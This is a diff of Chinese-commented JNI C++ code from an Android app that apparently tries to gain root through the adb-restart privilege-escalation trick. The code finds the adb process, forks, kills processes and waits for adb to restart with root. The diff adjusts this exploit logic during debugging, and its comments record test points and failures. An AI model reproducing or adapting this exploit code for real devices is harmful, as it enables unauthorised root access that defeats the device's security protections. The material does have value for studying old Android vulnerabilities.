@@ -11,8 +11,7 @@
 #include <signal.h>
 #include <stdlib.h>
 
-void die(const char *msg)
-{
+void die(const char *msg) {
     perror(msg);
     //将上一个函数发生错误的原因输出到标准设备，参数msg所指的字符串会先打印出
     //此错误原因依照全局变量errno(宏，返回左值)的值来决定要输出的字符串
@@ -53,8 +52,7 @@ void restart_adb(pid_t pid) {
     kill(pid,9);
 }
 
-void wait_for_root_adb(pid_t old_adb)
-{
+pid_t wait_for_root_adb(pid_t old_adb) {
     pid_t p = 0;
 
     for (;;) {
@@ -65,6 +63,8 @@ void wait_for_root_adb(pid_t old_adb)
     }
     sleep(5);
     kill(-1, 9);
+
+    return p;
 }
 
 void out() {
@@ -101,7 +101,16 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
 
     adb_pid = find_adb();
     //调用find_adb()函数来搜索Android系统中adb进程的PID。该函数读取每个进程对应的文件的/proc/<pid>/cmdline，根据其是否等于”/sbin/adb”来判断是否adb进程
-
+/*
+ * 测试find_adb(),成功返回进程号
+ */
+/*
+    std::string ss = "didn't root successfully!";
+    char tmp[256];
+    sprintf(tmp,"%d",adb_pid);
+    ss = tmp;
+    return env->NewStringUTF(ss.c_str());
+*/
     //测试点2
     //成功
 
@@ -122,14 +131,13 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
     //成功
 
     if (fork() > 0){//fork了一个新的进程，父进程退出，而子进程继续
-        exit(0);
+//        exit(0);
     }
     /* 在测试点1-5测试返回hello from c++
      * 测试结果：
      * fork()正常，返回hello from c++
      * exit(0)之后出错，程序可以正常打开，白板一块
      */
-
 
     //测试点5
     //失败
@@ -176,9 +184,14 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
     //注释掉exit(0)后
     //成功
 
+
+
 //进一步的，exploit杀掉adb进程，并在系统检测到这一现象并重启一个adb之前，再一次fork()，将前一个adb留下的进程空位占据
-    close(pepe[1]);
-    read(pepe[0], &c, 1);
+//    close(pepe[1]);
+//    read(pepe[0], &c, 1);
+
+
+
 
     //测试点8
     //注释掉exit(0)后
@@ -200,16 +213,20 @@ Java_com_example_zgd_result_MainActivity_getRoot(JNIEnv *env, jobject instance) 
     //注释掉exit(0)后
     //失败
 
-    wait_for_root_adb(adb_pid);//exploit调用wait_for_root_adb()，等待系统重启一个adb，这个新建的adb就会具有root权限
-    int result;
-    result = setsid();
-    std::string ss = "root successfully!";
+    pid_t result = wait_for_root_adb(adb_pid);//exploit调用wait_for_root_adb()，等待系统重启一个adb，这个新建的adb就会具有root权限
+
+    /*2017.7.10测试1
+     * 注释掉exit(0)以及close(pepe[1]);read(pepe[0],&c,1);后
+     * 在等待重启后测试不能正常返回
+     * 应用白板，没有复制(解压)
+     */
+
+//    result = setsid();
+    std::string ss = "didn't root successfully!";
     char tmp[256];
     sprintf(tmp,"%d",result);
     ss = tmp;
-//    return env->NewStringUTF(ss.c_str());
-//失败
-
+    return env->NewStringUTF(ss.c_str());
 }
 
 
